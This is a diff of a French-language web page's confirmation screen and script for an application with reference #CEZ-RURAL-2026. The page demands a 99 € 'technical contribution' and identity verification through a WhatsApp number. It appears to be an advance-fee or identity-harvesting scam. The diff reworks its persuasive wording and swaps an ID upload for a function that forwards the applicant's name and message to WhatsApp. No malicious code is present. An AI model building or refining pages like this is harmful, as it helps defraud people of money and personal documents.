@@ -517,36 +517,30 @@
                     <h3 style="color: var(--navy); margin: 5px 0; font-size: 1.1rem;">DOSSIER ENREGISTRÉ AVEC SUCCÈS !</h3>
                 </div>
                 
-                <div style="background: #fffdf5; border: 2px solid var(--gold); padding: 12px; border-radius: 6px; font-size: 0.72rem; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(197,160,89,0.2);">
-                    <p style="color: #b7791f; font-weight: 800; margin-bottom: 4px;"><i class="fas fa-exclamation-triangle"></i> ÉTAPE FINALE OBLIGATOIRE :</p>
-                    <p style="color: var(--navy); line-height: 1.4;">"Votre dossier a été pré-enregistré, mais l'étape finale de vérification d'identité est obligatoire pour valider définitivement votre demande."</p>
-                </div>
-
                 <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 10px; border-radius: 4px; font-size: 0.75rem; margin-bottom: 10px;">
                     <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
                     <p style="margin-top: 4px;"><strong>Contribution technique :</strong> 99 € (~105 USD)</p>
                 </div>
 
+                <div style="font-size: 0.7rem; color: #555; line-height: 1.4; margin-bottom: 10px;">
+                    🛡️ <strong>Notre engagement qualité :</strong> Votre dossier a été validé. Pour la vérification de votre pièce d'identité et de votre profil, veuillez nous contacter directement ci-dessous afin de finaliser l'instruction.
+                </div>
+
                 <p style="font-size: 0.72rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
-                    Choisissez l'une de ces 2 options pour finaliser votre vérification :
+                    Pour obtenir les instructions finales, choisissez l'une de ces options :
                 </p>
 
                 <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
-                    <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">Option 1 : Téléversement direct de la pièce d'identité</label>
-                    <input type="file" id="idFileUpload" class="form-input" style="font-size: 0.65rem; padding: 4px; margin-bottom: 6px;">
-                    <textarea id="clientMsgInput" placeholder="Écrivez votre message ou précisions..." style="width: 100%; height: 35px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
-                    <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Transmettre mon dossier</button>
+                    <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Laisser un message sur le site :</label>
+                    <textarea id="clientMsgInput" placeholder="Écrivez votre message..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
+                    <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Envoyer ma demande</button>
                 </div>
 
                 <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20et%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
-                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> Option 2 : Contact direct sur WhatsApp
+                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Contactez-nous sur WhatsApp
                 </a>
 
-                <div style="font-size: 0.6rem; color: #777; text-align: center; margin-top: 6px;">
-                    🔒 Données traitées conformément à notre politique de confidentialité.
-                </div>
-
-                <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.75rem; margin-top: 8px;">Fermer / Nouveau dossier</button>
+                <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.75rem;">Fermer / Nouveau dossier</button>
             </div>
         </div>
 
@@ -1074,3 +1068,19 @@
             alert("Erreur de connexion réseau lors de l'envoi du dossier.");
             document.getElementById('loader-overlay').style.display = 'none';
         }
+    }
+
+    async function sendClientMessage() {
+        const msg = document.getElementById('clientMsgInput').value.trim();
+        if(!msg) {
+            alert("Veuillez écrire un message.");
+            return;
+        }
+
+        const clientNom = document.getElementById('inputNom').value || "Anonyme";
+        const finalUrl = `https://wa.me/33780976404?text=Message%20depuis%20le%20site%20(Réf:%20${generatedRefCode},%20Nom:%20${encodeURIComponent(clientNom)}):%20${encodeURIComponent(msg)}`;
+        window.open(finalUrl, '_blank');
+    }
+</script>
+</body>
+</html>
